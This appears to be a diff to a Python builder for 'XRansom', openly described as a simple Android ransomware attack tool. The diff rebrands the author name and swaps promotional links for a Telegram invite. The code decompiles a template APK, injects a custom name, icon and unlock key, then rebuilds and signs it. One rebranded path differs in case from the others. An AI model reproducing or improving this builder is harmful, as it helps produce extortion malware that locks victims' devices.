@@ -25,13 +25,13 @@ def banner():
     print(w+d+"           ,'/ \`.                ")
     print(w+d+"          |\/___\/|               ")
     print(w+d+"          \'\   /`/               ")
-    print(w+d+"           `.\ /,'                "+w+b+"X PHANTOM XPH4N70M")
+    print(w+d+"           `.\ /,'                "+w+b+"Y Joon HryJoon")
     print(w+d+"              |                   "+w+"The author is not responsible")
     print(w+d+"              |                   "+w+"for any issues or damage")
     print(w+d+"             |=|                  "+w+"join us")
-    print(w+d+"        /\  ,|=|.  /\             "+w+"https://bit.ly/3PV3S3r")
+    print(w+d+"        /\  ,|=|.  /\             "+w+"https://t.me/+uH8SsTPuqds3MWYy")
     print(w+d+"    ,'`.  \/ |=| \/  ,'`.         "+w+"Tutorial")
-    print(w+d+"  ,'    `.|\ `-' /|,'    `.       "+w+"https://bit.ly/3GOXLtC")
+    print(w+d+"  ,'    `.|\ `-' /|,'    `.       "+w+"")
     print(w+d+",'   .-._ \ `---' / _,-.   `.     ")
     print(w+d+"   ,'    `-`-._,-'-'    `.        ")
     print(w+d+"  '                       `       ")
@@ -61,7 +61,7 @@ def start():
     print(f"""
     {r}XRansom{w} is a Simple Android Ransomware Attack
     {w}The user can customize the App Icon, Name, Key and others.
-    {d}support us https://bit.ly/3PV3S3r !{w}
+    {d}support us https://t.me/+uH8SsTPuqds3MWYy !{w}
     """)
     print(b+"> "+w+os.popen("curl ifconfig.co/city --silent").readline().strip()+", "+os.popen("curl ifconfig.co/country --silent").readline().rstrip()+time.strftime(", %d/%m/%Y (%H.%M.%S)"))
     print(b+">"+w+" Use \\n for newline and CTRL + C for exit")
@@ -100,16 +100,16 @@ def start():
         else: continue
     print(w+"* Building your ransomware APK's ...")
     print(w+"-"*43+d)
-    os.system("apktool d xphantom.apk")
+    os.system("apktool d HryJoon.apk")
     imgpath = [
-        "xphantom/res/drawable-mdpi-v4/ic_launcher.png",
-        "xphantom/res/drawable-xhdpi-v4/ic_launcher.png",
-        "xphantom/res/drawable-hdpi-v4/ic_launcher.png",
-        "xphantom/res/drawable-xxhdpi-v4/ic_launcher.png",
+        "HryJoon/res/drawable-mdpi-v4/ic_launcher.png",
+        "HryJoon/res/drawable-xhdpi-v4/ic_launcher.png",
+        "Hryjoon/res/drawable-hdpi-v4/ic_launcher.png",
+        "HryJoon/res/drawable-xxhdpi-v4/ic_launcher.png",
     ]
-    strings = "xphantom/res/values/strings.xml"
+    strings = "HryJoon/res/values/strings.xml"
     print("I: Using strings "+strings)
-    smali = os.popen(f"find -L xphantom/ -name '*0000.smali'","r").readline().strip()
+    smali = os.popen(f"find -L HryJoon/ -name '*0000.smali'","r").readline().strip()
     print("I: Using smali "+os.path.basename(smali))
     writefile(strings,"appname",app_name)
     print("I: Adding name with "+app_name)
@@ -131,7 +131,7 @@ def start():
                 os.system("rm -rf "+logo)
                 print("I: Adding icon with "+os.path.basename(app_icon)+" size: "+size)
         else: exit(1)
-    os.system("apktool b xphantom -o final.apk;rm -rf xphantom")
+    os.system("apktool b HryJoon -o final.apk;rm -rf HryJoon")
     os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
     os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
     os.system("rm -rf final.apk")
@@ -145,4 +145,4 @@ if __name__ == "__main__":
     try:
         start()
     except KeyboardInterrupt:
-        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    Join Us All \033[4mhttps://bit.ly/3PV3S3r/033[0m\n    exiting ...")
+        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    Join Us All \https://t.me/+uH8SsTPuqds3MWYy    exiting ...")
